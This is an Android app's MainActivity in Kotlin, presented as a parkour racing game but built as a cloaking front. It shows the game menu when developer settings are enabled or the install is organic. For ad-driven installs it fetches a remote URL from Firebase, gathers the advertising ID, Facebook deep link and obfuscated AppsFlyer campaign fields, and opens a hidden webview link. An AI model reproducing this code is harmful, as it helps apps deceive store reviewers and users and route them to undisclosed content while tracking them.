package com.parkourrace.gam

import android.animation.ObjectAnimator
import android.app.AlertDialog
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.animation.AccelerateInterpolator
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.core.animation.doOnEnd
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.lifecycle.lifecycleScope
import androidx.navigation.compose.rememberNavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.parkourrace.gam.di.CrazyRichesApplication
import com.parkourrace.gam.ui.theme.CrazyRichesTheme
import com.parkourrace.gam.utils.crazyRichesCheckInternet
import com.parkourrace.gam.utils.crazyRichesVigenere
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

class MainActivity : ComponentActivity() {
    private val crazyRichesViewModel: MainViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseApp.initializeApp(this)
        installSplashScreen().setOnExitAnimationListener { splashView ->
            val crazyRichesHeight = splashView.view.height.toFloat()
            ObjectAnimator.ofFloat(
                splashView.view,
                View.TRANSLATION_Y,
                0F,
                crazyRichesHeight / 16,
                crazyRichesHeight / 8,
                crazyRichesHeight / 4,
                crazyRichesHeight / 2,
                crazyRichesHeight
            ).apply {
                interpolator = AccelerateInterpolator()
                duration = 700L
                doOnEnd { splashView.remove() }
                start()
            }
        }
        setContent {
            val navController = rememberNavController()
            CrazyRichesTheme {
                CrazyRichesApp(navController)
            }

        }

        crazyRichesInitLoading()
    }

    private fun crazyRichesInitLoading() {
        crazyRichesViewModel.crazyRichesLoading.value = true
        if (!crazyRichesCheckInternet(this)) {
            crazyRichesViewModel.crazyRichesLoading.value = false
            crazyRichesNoInternetDialog()
            return
        }
        if (Settings.Secure.getInt(
                this.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            ) == 1
        ) {
            crazyRichesNavigateToMenu()
            return
        }

        crazyRichesViewModel.crazyRichesGetCacheLink(this) {
            Log.d(TAG, "crazyRichesInitLoading: $it")
            if (it.isNotBlank()) crazyRichesNavigateToWeb(it) else crazyRichesInitFirebase()
        }
    }

    private fun crazyRichesInitFirebase() {
        val crazyRichesSettings =
            FirebaseRemoteConfigSettings.Builder().setFetchTimeoutInSeconds(2500).build()
        FirebaseRemoteConfig.getInstance().apply {
            setConfigSettingsAsync(crazyRichesSettings)
            fetchAndActivate().addOnCompleteListener {
                val crazyRichesUrl = this.getString(getString(R.string.firebase_root_url))
                val crazyRichesOrganic = this.getBoolean(getString(R.string.firebase_organic))
                crazyRichesViewModel.crazyRichesSetUrlAndOrganic(crazyRichesUrl, crazyRichesOrganic) { isCorrectUrl ->
                    if (isCorrectUrl) crazyRichesStartWork() else crazyRichesNavigateToMenu()
                }
            }
        }
    }

    private fun crazyRichesStartWork() = lifecycleScope.launch {
        withContext(Dispatchers.IO) {
            crazyRichesInitFB()
            crazyRichesGetGoogleID()
        }
        crazyRichesGetAFParams()
    }

    private fun crazyRichesGetGoogleID() {
        val crazyRichesGoogleID = AdvertisingIdClient.getAdvertisingIdInfo(this).id.toString()
        crazyRichesViewModel.crazyRichesSetGoogleID(crazyRichesGoogleID)
    }

    private fun crazyRichesInitFB() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(this) {
            val crazyRichesData = it?.targetUri
            crazyRichesViewModel.crazyRichesSetDeepLink(crazyRichesData)
        }
    }

    private fun crazyRichesGetAFParams() {
        val crazyRichesAFID = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        crazyRichesViewModel.crazyRichesSetAFID(crazyRichesAFID.toString())

        CrazyRichesApplication.crazyRichesAppsFlyerState.observe(this) {
            it.forEach { inform ->
                when (inform.key) {
                    "ct_eiakeg".crazyRichesVigenere() -> crazyRichesViewModel.crazyRichesSetAFStatus(inform.value.toString())
                    "eoyeazqb".crazyRichesVigenere() -> crazyRichesViewModel.crazyRichesSetAFCampaign(inform.value.toString())
                    "ospxa_jyiltv".crazyRichesVigenere() -> crazyRichesViewModel.crazyRichesSetAFMediaSource(inform.value.toString())
                    "ct_owaexsf".crazyRichesVigenere() -> crazyRichesViewModel.crazyRichesSetAFChannel(inform.value.toString())
                }
            }
            crazyRichesCollectLink()
        }
    }


    private fun crazyRichesCollectLink() {
        if (crazyRichesViewModel.checkOrganic()) {
            crazyRichesNavigateToMenu()
            return
        }
        crazyRichesViewModel.crazyRichesCollectLink(this) { link ->
            crazyRichesNavigateToWeb(link)
        }
    }

    private fun crazyRichesNavigateToMenu() {
        crazyRichesViewModel.crazyRichesRouteString.value = "menu"
    }

    private fun crazyRichesNavigateToWeb(link: String) {
        val crazyRichesUrl = URLEncoder.encode(link, StandardCharsets.UTF_8.toString())
        crazyRichesViewModel.crazyRichesRouteString.value = "web/$crazyRichesUrl"
        Log.d(TAG, "crazyRichesNavigateToWeb: $link")
    }

    private fun crazyRichesNoInternetDialog(): AlertDialog =
        AlertDialog.Builder(this)
            .setTitle("No internet connection")
            .setMessage("Check your internet connection and try again later")
            .setCancelable(false)
            .setPositiveButton("Try again") { dialog, _ ->
                crazyRichesInitLoading()
                dialog.dismiss()
            }
            .show()
}